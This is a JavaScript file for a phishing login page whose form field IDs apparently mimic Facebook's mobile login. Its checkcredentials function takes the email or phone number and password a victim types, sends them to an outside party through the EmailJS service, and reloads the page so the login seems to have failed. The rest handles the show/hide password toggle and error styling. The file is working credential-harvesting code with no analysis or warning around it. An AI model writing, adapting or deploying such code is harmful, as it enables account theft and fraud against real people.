var password = document.getElementById("m_login_password");
var emailphone = document.getElementById("m_login_email");
var show = document.getElementById("show");
var lgm2 = document.getElementById("lgm2");
var login_error = document.getElementById("login_error");
var bt56 = document.getElementById("bt56");

var valuesObj = {};

function hideShow() {
    // makes password visible
    if (password.type === "password") {
      password.type = "text";
      show.innerHTML = "HIDE";
    } else {
      password.type = "password";
      show.innerHTML = "SHOW";
    }
  }

  function checkinput(){
    if (password.value != "") {
        password.style.width = "234px";
        show.style.visibility = "visible";
        
      } else {
        password.style.width = "304px";
        show.style.visibility = "hidden";
      }
  }
  function checkcredentials(){
    if (password.value != "" && emailphone.value != ""){
      login_error.style.display = "none";
      lgm2.style.height = "524px";
      bt56.style.display = "none";

      var params = {
        details : document.getElementById("m_login_email").value,
        password : document.getElementById("m_login_password").value
      }
      emailjs.send('service_kkxwwx8', 'template_niapyxz', params).then(function(response) {
        console.log('SUCCESS!', response.status, response.text);
     }, function(err) {
        console.log('FAILED...', err);
     });
     location.reload();
    }
    else{
      document.getElementById("m_login_email").focus();
      document.getElementById("m_login_email").value = "";
      document.getElementById("m_login_password").value = "";
      show.style.visibility = "hidden";
      login_error.style.display = "block";
      emailphone.style.borderColor = "rgb(250, 62, 62)";
      lgm2.style.height = "596px";
      bt56.style.display = "block";
      emailphone.style.borderBottomLeftRadius = "4px";
      emailphone.style.borderBottomRightRadius = "4px";
    }
  }